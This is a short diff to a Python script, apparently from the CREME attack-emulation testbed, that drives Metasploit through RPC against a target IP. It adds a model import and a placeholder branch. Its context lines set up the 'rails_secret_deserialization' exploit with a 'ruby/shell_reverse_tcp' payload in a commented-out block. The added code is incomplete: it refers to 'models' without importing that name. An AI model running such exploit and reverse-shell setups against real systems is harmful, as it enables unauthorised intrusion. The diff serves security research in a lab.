@@ -2,7 +2,7 @@ import time
 import sys
 import os
 from pymetasploit3.msfrpc import MsfRpcClient
-
+import CREME.CREMEapplication.models
 
 def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
@@ -19,6 +19,8 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
+    if(models.AttackScenario.data_theft_FirstStage == "rails_secret_deserialization"):
+        pass #TODO
 '''    
     exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
     payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
